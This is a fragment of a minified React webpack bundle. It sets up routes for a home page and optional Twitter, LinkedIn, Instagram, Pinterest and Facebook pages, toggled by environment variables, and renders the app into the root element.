o.a.createElement(l.d,null,o.a.createElement(l.b,{path:"/",component:A,exact:!0}),"true"===B.REACT_APP_TWITTER?o.a.createElement(l.b,{path:"/Twitter",component:y,exact:!0}):"","true"===B.REACT_APP_LINKEDIN?o.a.createElement(l.b,{path:"/LinkedIn",component:N,exact:!0}):"","true"===B.REACT_APP_INSTAGRAM?o.a.createElement(l.b,{path:"/Instagram",component:P,exact:!0}):"","true"===B.REACT_APP_PINTEREST?o.a.createElement(l.b,{path:"/Pinterest",component:L,exact:!0}):"","true"===B.REACT_APP_FACEBOOK?o.a.createElement(l.b,{path:"/Facebook",component:x,exact:!0}):"")},F=a(14),j=a(7),M=Object(j.a)();c.a.render(o.a.createElement(F.a,{history:M},o.a.createElement(D,null)),document.getElementById("root"))}},[[40,1,2]]]);
//# sourceMappingURL=main.fc33876e.chunk.js.map